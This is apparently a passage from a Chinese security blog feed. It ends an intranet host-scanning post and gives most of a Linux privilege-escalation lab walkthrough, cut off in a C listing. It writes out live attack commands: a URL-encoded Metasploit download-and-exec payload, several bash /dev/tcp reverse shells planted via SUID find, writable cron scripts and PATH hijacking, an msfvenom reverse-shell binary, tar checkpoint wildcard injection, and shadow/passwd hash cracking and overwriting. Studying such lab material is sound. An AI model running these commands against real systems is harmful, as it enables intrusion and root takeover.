done</code></p>\n<p>但是速度太慢</p>\n<h4 id=\"invoke-tspingsweepps1\"><a class=\"markdownIt-Anchor\" href=\"#invoke-tspingsweepps1\">#</a> Invoke-TSPingSweep.ps1</h4>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>powershell.exe -exec bypass -Command \"Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135\"</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304194141615.png\" alt=\"image-20240304194141615\"></p>\n<h4 id=\"arp-scan\"><a class=\"markdownIt-Anchor\" href=\"#arp-scan\">#</a> ARP-scan</h4>\n<p><code>arp-scan -t 10.10.10.0/24</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304194058816.png\" alt=\"image-20240304194058816\"></p>\n<h4 id=\"nbtscan\"><a class=\"markdownIt-Anchor\" href=\"#nbtscan\">#</a> nbtscan</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy51bml4d2l6Lm5ldC90b29scy9uYnRzY2FuLmh0bWw=\">http://www.unixwiz.net/tools/nbtscan.html</span></p>\n<p><code>nbtscan 10.10.10.0/24</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304221708922.png\" alt=\"image-20240304221708922\"></p>\n<h4 id=\"tcping\"><a class=\"markdownIt-Anchor\" href=\"#tcping\">#</a> tcping</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGlmdWxrZXJzb24uY29tL3Byb2plY3RzL3RjcGluZy5waHA=\">https://elifulkerson.com/projects/tcping.php</span></p>\n<p><code>tcping -n ip 端口</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304222152734.png\" alt=\"image-20240304222152734\"></p>\n<h4 id=\"fscan\"><a class=\"markdownIt-Anchor\" href=\"#fscan\">#</a> fscan</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoYWRvdzFuZy9mc2Nhbg==\">https://github.com/shadow1ng/fscan</span></p>\n<p>fscan.exe -h 10.10.10.1-255 -p 22,445</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304222456424.png\" alt=\"image-20240304222456424\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/",
            "url": "http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/",
            "title": "linux提权",
            "date_published": "2023-11-10T09:52:23.000Z",
            "content_html": "<h3 id=\"信息收集命令\"><a class=\"markdownIt-Anchor\" href=\"#信息收集命令\">#</a> 信息收集命令</h3>\n<h4 id=\"系统信息\"><a class=\"markdownIt-Anchor\" href=\"#系统信息\">#</a> 系统信息</h4>\n<ul>\n<li><strong> <code>uname -a</code> </strong>: 显示内核、操作系统和 CPU 信息。</li>\n<li><strong> <code>head -n 1 /etc/issue</code> </strong>: 显示操作系统版本。</li>\n<li><strong> <code>cat /proc/version</code> </strong>: 显示系统信息。</li>\n<li><strong> <code>hostname</code> </strong>: 显示计算机名。</li>\n<li><strong> <code>env</code> </strong>: 显示环境变量。</li>\n</ul>\n<h4 id=\"网络信息\"><a class=\"markdownIt-Anchor\" href=\"#网络信息\">#</a> 网络信息</h4>\n<ul>\n<li><strong> <code>ifconfig</code> </strong>: 显示网络接口信息（现在更常用的是 <code>ip addr show</code> ）。</li>\n<li><strong> <code>netstat -lntp</code> </strong>: 显示所有监听端口。</li>\n<li><strong> <code>netstat -antp</code> </strong>: 显示所有已建立的连接。</li>\n<li><strong> <code>netstat -s</code> </strong>: 显示网络统计信息。</li>\n<li><strong> <code>iptables -L</code> </strong>: 显示防火墙设置。</li>\n<li><strong> <code>route -n</code> </strong>: 显示路由表。</li>\n</ul>\n<h4 id=\"用户组信息系统服务\"><a class=\"markdownIt-Anchor\" href=\"#用户组信息系统服务\">#</a> 用户组信息系统服务</h4>\n<ul>\n<li><strong> <code>w</code> </strong>：显示活动用户和他们正在使用的终端等信息。</li>\n<li><strong> <code>id [username]</code> </strong>：显示指定用户的信息，包括用户 ID（UID）、所属用户组等。</li>\n<li><strong> <code>last</code> </strong>：显示用户登录的历史记录，包括登录时间和来源。</li>\n<li><strong> <code>cut -d: -f1 /etc/passwd</code> </strong>：显示系统上所有用户的用户名。</li>\n<li><strong> <code>cut -d: -f1 /etc/group</code> </strong>：显示系统上所有组的组名。</li>\n<li><strong> <code>crontab -l</code> </strong>：显示当前用户的计划任务（定时任务）。</li>\n<li><strong> <code>chkconfig --list</code> </strong>：列出所有系统服务。</li>\n<li><strong> <code>chkconfig --list | grep on</code> </strong>：列出所有已启动的系统服务。</li>\n<li><strong> <code>echo $PATH</code> </strong>：显示系统的路径列表，用冒号分隔的目录列表表示系统在搜索可执行文件时的顺序。</li>\n</ul>\n<h4 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p><code>nmap -sT 192.168.244.0/24</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190515553.png\" alt=\"\"></p>\n<p>访问 80 没啥东西扫一下目录</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190852090.png\" alt=\"image-20231121190852090\"></p>\n<p>扫到一个 shell.php</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191144694.png\" alt=\"image-20231121191144694\"></p>\n<h4 id=\"反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>参数是 cmd 可以执行命令</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191211218.png\" alt=\"image-20231121191211218\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191300474.png\" alt=\"image-20231121191300474\"></p>\n<p><code>msf script/web_delivery模块 反弹shell</code></p>\n<p><code>use exploit/multi/script/web_delivery </code></p>\n<p><code>set lhost 192.168.244.128</code></p>\n<p><code>set lport 9000</code></p>\n<p><code>run</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191557311.png\" alt=\"image-20231121191557311\"></p>\n<p>复制 payload 并且 url 编码添加在 cmd 参数后面执行得到 shell</p>\n<p><code>python%20-c%20%22import%20sys%3Bimport%20ssl%3Bu%3D__import__('urllib'%2B%7B2%3A''%2C3%3A'.request'%7D%5Bsys.version_info%5B0%5D%5D%2Cfromlist%3D('urlopen'%2C))%3Br%3Du.urlopen('http%3A%2F%2F192.168.244.128%3A8080%2FsZTvRL2bM'%2C%20context%3Dssl._create_unverified_context())%3Bexec(r.read())%3B%22</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191810361.png\" alt=\"image-20231121191810361\"></p>\n<h4 id=\"主机信息收集\"><a class=\"markdownIt-Anchor\" href=\"#主机信息收集\">#</a> 主机信息收集</h4>\n<p>先拿一个交互 shell</p>\n<p><code>**python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'**</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121192112964.png\" alt=\"image-20231121192112964\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>显示内核、操作系统和CPU信息</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Linux osboxes <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">45</span><span class=\"token operator\">-</span>generic <span class=\"token comment\">#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>操作系统版本</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Linux Lite <span class=\"token number\">4.4</span> LTS \\n \\l</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>显示系统信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Linux version <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">45</span><span class=\"token operator\">-</span>generic <span class=\"token punctuation\">(</span>buildd@lgw01<span class=\"token operator\">-</span>amd64<span class=\"token operator\">-</span><span class=\"token number\">031</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>gcc version <span class=\"token number\">7.3</span><span class=\"token number\">.0</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">7.3</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>16ubuntu3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>环境变量</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>env</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>APACHE_LOG_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>LANG<span class=\"token operator\">=</span>C</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>INVOCATION_ID<span class=\"token operator\">=</span>15ecc432bc2940368927675d4ac3a3a3</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>APACHE_LOCK_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>lock<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>PWD<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>JOURNAL_STREAM<span class=\"token operator\">=</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token number\">21980</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>APACHE_RUN_GROUP<span class=\"token operator\">=</span>user6</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>APACHE_RUN_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>run<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>APACHE_RUN_USER<span class=\"token operator\">=</span>user6</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>APACHE_PID_FILE<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>run<span class=\"token operator\">/</span>apache2<span class=\"token operator\">/</span>apache2<span class=\"token punctuation\">.</span>pid</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>SHLVL<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>PATH<span class=\"token operator\">=</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token builtin\">bin</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>_<span class=\"token operator\">=</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token operator\">/</span>env</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>计算机名</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>osboxes</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>系统路径列表</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token builtin\">bin</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>开启的服务</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>mysql 开启</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>用户</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>vboxadd</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>user1</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>user2</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>user3</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>user4</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>statd</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>user5</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>user6</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mysql</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>user7</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>user8</pre></td></tr></table></figure><h4 id=\"suid提权\"><a class=\"markdownIt-Anchor\" href=\"#suid提权\">#</a> SUID 提权</h4>\n<p>SUID（Set User ID）是一种权限设置，允许用户以文件所有者的权限来执行文件，即使用户自身的权限可能不足以执行该文件。</p>\n<p>在 Unix 或类 Unix 系统中，当一个可执行文件的 SUID 位被设置为 1 时，无论谁执行该文件，都会以该文件的所有者身份执行。这种权限设置通常用于系统文件或程序，以便允许普通用户执行特定的任务或命令，而无需暴露超出其权限范围的访问权限。</p>\n<p><code>find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000-print2&gt;/dev/null find / -user root -perm -4000-exec ls -ldb &#123;&#125; \\;</code></p>\n<p>在 Unix 或 Linux 系统中查找具有 SUID 权限设置的文件。它会搜索整个文件系统 (“/”)，找到具有 SUID 权限设置的文件 (“-perm  -u=s”) 并将它们显示出来。同时，将任何错误消息重定向到 /dev/null，以避免它们显示在屏幕上。</p>\n<p>常见的提权文件</p>\n<p><code>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</code></p>\n<p>查询到有一个 find</p>\n<p>cd /  cd /tmp 到 tmp 目录</p>\n<p>创建一个文件</p>\n<p>touch 1234</p>\n<p>find 1234 -exec whoami ;</p>\n<p>这个命令的作用是在当前目录下搜索名为 “1234” 的文件或目录，并对找到的每一个执行  <code>whoami</code>  命令。</p>\n<p><code>find</code>  命令用于查找文件和目录， <code>-exec</code>  选项允许在找到的每一个项目上执行特定的命令， <code>\\;</code>  表示命令结束。</p>\n<p>如果在当前目录下存在名为 “1234” 的文件或目录，对于每一个找到的 “1234”， <code>whoami</code>  命令将被执行，显示当前执行命令的用户的用户名。</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132333459.png\" alt=\"image-20240207132333459\"></p>\n<p>反弹 shell</p>\n<p><code>find /etc/passwd -exec bash -ip &gt;&amp; /dev/tcp/192.168.244.128/4343 0&gt;&amp;1 \\;</code></p>\n<p>nc 开启监听接收到会话</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132540518.png\" alt=\"image-20240207132540518\"></p>\n<h3 id=\"可读shadow文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可读shadow文件利用\">#</a> 可读 shadow 文件利用</h3>\n<p>Shadow 文件的概述:</p>\n<p>Shadow 文件是一个 Linux 系统中存储加密用户密码和其他身份信息，如账号过期时间，密码过期时间，账户锁定和密码最小长度等等的重要文件。</p>\n<p>Shadow 文件位于 /etc/shadow ，只有 root 用户有权限访问它。</p>\n<p>shadow 文件与 passwd 文件的关系：早些版本加密后的密码是保存在 passwd 文件里第二个字段的位置也就是图中 x 的位置</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221212919749.png\" alt=\"image-20240221212919749\"></p>\n<p>但是呢虽然是加密的还是有可能被破解所以加上了 shadow 这个文件而 passwd 文件里的就被替换为了 X 占位，因为 shadow 文件只有 root 用户可以访问所以相对比较安全，不过有时管理员对文件权限错误配置也会导致被拿来恶意利用</p>\n<p>文件格式：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root:<span class=\"token variable\">$6</span><span class=\"token variable\">$mqjgcFoM</span><span class=\"token variable\">$X</span>/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</pre></td></tr></table></figure><p>利用条件 shadow 有权查看</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213805632.png\" alt=\"image-20240221213805632\"></p>\n<p>获取 root 用户信息并保存在新建文件中</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213918116.png\" alt=\"image-20240221213918116\"></p>\n<p>root:<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>6</mn></mrow><annotation encoding=\"application/x-tex\">6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">6</span></span></span></span>mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</p>\n<p>利用工具 john 来破解</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220225042.png\" alt=\"image-20240221220225042\"></p>\n<p>得到明文密码就可以切换 root 了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220330572.png\" alt=\"image-20240221220330572\"></p>\n<h3 id=\"可写shadow文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可写shadow文件利用\">#</a> 可写 shadow 文件利用</h3>\n<p>利用原理：把 shadow 文件里 root 用户 hash 值替换为自己生成的就可以 hash 再用生成用到的明文进行登录 root</p>\n<p>前提要有 shadow 可写权限</p>\n<p>通过 mkpasswd 生成哈希</p>\n<p><code>mkpasswd -m sha-512 1234567</code></p>\n<p><code>$6$hpRA5YNV9lAANtsF$JwX/K8VfxhxpTm5U2oTEgFw.YiYVCmfzZ0i6SqUDkpJRamWVmQ0LgflQUlhjVHkAS5N8MwFFR12mHBg6qFhwC/</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221309745.png\" alt=\"image-20240221221309745\"></p>\n<p>用 sha-512 是因为</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$6</span>$开头的，表明是用SHA-512加密的，密文长度86</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$1</span>$ 表明是用MD5加密的，密文长度22个字符</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$2</span>$ 是用Blowfish加密的，</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token variable\">$5</span>$ 是用 SHA-256加密的，密文长度43</pre></td></tr></table></figure><p>接着把生成的 hash 替换原本的就可以用 1234567 登陆了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221617115.png\" alt=\"image-20240221221617115\"></p>\n<h3 id=\"可写passwd文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可写passwd文件利用\">#</a> 可写 passwd 文件利用</h3>\n<p>虽然 passwd 文件里 hash 被 X 替代了无法查看但是把 X 替换为我们生成的 hash 还是可以登陆的</p>\n<p>利用 openssl 生成</p>\n<p><code>openssl passwd 987654321</code></p>\n<p><code>$1$uOZ/Tr4f$EqDyR9WU8wJNeB3tEY09f.</code></p>\n<p>把 passwd 里 root 的 X 替换</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221222616639.png\" alt=\"image-20240221222616639\"></p>\n<p>即可用 987654321 切换 root</p>\n<h3 id=\"计划任务提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务提权\">#</a> 计划任务提权</h3>\n<p>查看计划任务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222000243892.png\" alt=\"image-20240222000243892\"></p>\n<p><code>* * * * * root    /home/crontab.sh</code></p>\n<p>这条计划任务的意思是每 1 分钟执行一次 crontab.sh 脚本，并且是以 root 用户的权限来执行。</p>\n<p>而这个文件我们是有权更改的那么就可以写入反弹 shell 命令</p>\n<p><code>echo 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.139/4444 0&gt;&amp;1&quot;' &gt; crontab.sh</code></p>\n<p>nc 进行监听等一分钟拿 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222003928818.png\" alt=\"image-20240222003928818\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222005508201.png\" alt=\"image-20240222005508201\"></p>\n<h3 id=\"计划任务环境变量提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务环境变量提权\">#</a> 计划任务环境变量提权</h3>\n<p>如果你在计划任务中没有指定程序的绝对路径，系统会在 crontab 文件中的 <code>PATH</code>  环境变量所列出的目录中查找该程序。这些目录会按照在 <code>PATH</code>  变量中的顺序被检查。如果在某个目录中找到了该程序，系统就会停止搜索并执行该程序。</p>\n<p>图中每分钟执行一次 <code>shell.sh</code>  脚本但是没有指定绝对路径， <code>PATH</code>  中默认优先查找 /home/yunyi 路径下有没有 shell.sh 有的话</p>\n<p>就每分钟执行，利用这个特性就可以在 <code>yunyi</code>  目录中创建一个 <code>shell.sh</code>  并写上反弹 shell 进行提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png\" alt=\"image-20240223220655325\"></p>\n<p><code>#!/bin/bash</code></p>\n<p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.142/7676 0&gt;&amp;1&quot;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220835815.png\" alt=\"image-20240223220835815\"></p>\n<p>别忘了给执行权限 <code>chmod +x shell.sh</code></p>\n<p><code>kali：nc -vlnp 7676</code></p>\n<p>获取 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221033086.png\" alt=\"image-20240223221033086\"></p>\n<h3 id=\"计划任务通配符提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务通配符提权\">#</a> 计划任务通配符提权</h3>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png\" alt=\"image-20240223220655325\"></p>\n<p>这里还有一个 zip.sh 看一下内容是</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221316077.png\" alt=\"image-20240223221316077\"></p>\n<p>到 home/yunyi/user 目录下打包所有文件夹文件到 /tmp 目录下名为 yunyi.tar.gz</p>\n<p>利用 tar <code>命令的</code> –checkpoint <code>和</code> –checkpoint-action</p>\n<p>tar <code>命令的</code> –checkpoint <code>和</code> –checkpoint-action <code>参数可以被用来执行提权操作这是因为</code>  tar` 命令在处理文件时，可以在每个检查点 checkpoint 执行一个特定的动作 action</p>\n<p>如果管理员给予了某个普通用户 <code>tar</code>  命令的超级管理员操作权限，那么我们可以使用 <code>tar</code>  命令进行提权例如，以下命令可以创建一个新的归档文件，并在每个检查点执行 <code>/bin/bash</code>  命令</p>\n<p><code>sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&quot;/bin/bash&quot;</code></p>\n<p>在这个命令中， <code>--checkpoint=1</code>  表示每处理一个文件就设置一个检查点， <code>--checkpoint-action=exec=&quot;/bin/bash&quot;</code>  表示在每个检查点执行 <code>/bin/bash</code>  命令因为 <code>tar</code>  命令是以 <code>root</code>  用户的身份运行的，所以 <code>/bin/bash</code>  命令也会以 <code>root</code>  用户的身份运行，从而获得 <code>root</code>  权限</p>\n<p>kali 生成反弹 shell 文件</p>\n<p><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=8989 -f elf -o shell.elf</code></p>\n<p>启动一个 http 服务受害机下载 shell 文件并给予权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132512587.png\" alt=\"image-20240224132512587\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132558854.png\" alt=\"image-20240224132558854\"></p>\n<p>在 user 目录创建这两个文件</p>\n<p><code>touch /home/yunyi/user/--checkpoint-action=exec=shell.elf</code></p>\n<p><code>touch /home/yunyi/user/--checkpoint=1</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224133036613.png\" alt=\"image-20240224133036613\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224140015673.png\" alt=\"image-20240224140015673\"></p>\n<p><code>nc -lvnp 8989</code>  拿到权限</p>\n<p>也可以创建一个 sh 脚本反弹 shell</p>\n<p><code>touch /home/yunyi/user/--checkpoint-action=exec=sh shell.sh</code></p>\n<h3 id=\"suid原理详解\"><a class=\"markdownIt-Anchor\" href=\"#suid原理详解\">#</a> SUID 原理详解</h3>\n<h4 id=\"suid共享库提权\"><a class=\"markdownIt-Anchor\" href=\"#suid共享库提权\">#</a> SUID 共享库提权</h4>\n<p>其实 suid 提权原理就是利用有 s 位的程序去执行我们的恶意文件恶意命令</p>\n<p>编写一个有漏洞的程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dlfcn.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span 